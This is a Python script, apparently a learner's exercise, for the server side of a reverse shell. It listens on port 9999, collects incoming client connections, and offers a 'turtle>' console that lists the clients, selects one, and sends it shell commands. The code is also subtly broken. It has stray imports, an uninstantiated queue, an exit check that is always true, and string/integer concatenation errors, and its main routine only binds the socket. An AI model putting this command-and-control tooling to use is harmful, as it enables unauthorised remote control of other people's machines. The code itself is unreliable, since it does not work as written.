from re import S
import socket
import sys
from this import s
import threading
import time
from queue import Queue as queue
NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
all_adress = []
all_connections=[]


def create_socket():
    global host,port,s
    try:
        host ="localhost"
        port=9999
        s=socket.socket()
        print("Socket created")
    except socket.error as msg:
        print("socket creation error "+ str(msg))

# binding the socket and listeneing for connections
def bind_socket():
    try:
        global host,port,s
        print("binding the port : " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as e:
        print("binding error " +str(e) + "\nRetrying...")
        bind_socket()

# establish connection with client
# def socket_accept():
#     conn,address=s.accept()
#     print("Connection has been established "+ "IP: " + address[0] + " port: "+ str(address[1]))
#     send_commands(conn)
#     s.close()

# # send commands
# def send_commands(conn):
#     while True:
#         cmd=input("Enter command: ")
#         # if cmd=="exit"or "quit":
#         #     conn.close()
#         #     s.close()
#         #     sys.exit()
#         if len(str.encode(cmd)) > 0:
#             conn.send(str.encode(cmd))
#             client_response=str(conn.recv(1024).decode("utf-8"))
#             print(client_response,end="")



# multiple connections
#handling connections from multiple clients
#closing previous connections
def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_adress[:]
    while True:
        try:
            conn,address=s.accept()
            s.setblocking(1) #prevents timeout to happen
            all_connections.append(conn)
            all_adress.append(address)
            print("The connection has been established : "+ address[0])
        except:
            print("error accepting connections")
# second thread
# select all the clients and send coomands
def start_turtle():
    while True:
        cmd=input("turtle> ")
        if cmd == 'list':
            list_connections()
        elif "select" in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")
def list_connections():
    results=""
    selectID=0
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_adress[i]
            continue
        results=str(i)+"  "+str(all_adress[i][0]+ "  "+str(all_adress[i][1]+"\n"))
    print("----------clients--------------"+"\n"+results)
def get_target(cmd):
    try:
        target = cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        print('you are now connected to : '+str(all_connections[target][0]))
        print(str(all_adress[target][1]+">",end=""))
        return conn
    except:
        print("selection not valid")
        return None
def send_target_commands(conn):
    while True:
        try:
            cmd=input("Enter command: ")
            if cmd=="exit"or "quit":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480).decode("utf-8"))
                print(client_response,end="")
        except:
            print("error sending commands!")
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_turtle()
        queue.task_done()
def create_job():
    for x in  JOB_NUMBER:
        queue.put(x)
    queue.join()
def main():
    create_socket()
    bind_socket()
    # socket_accept()

main()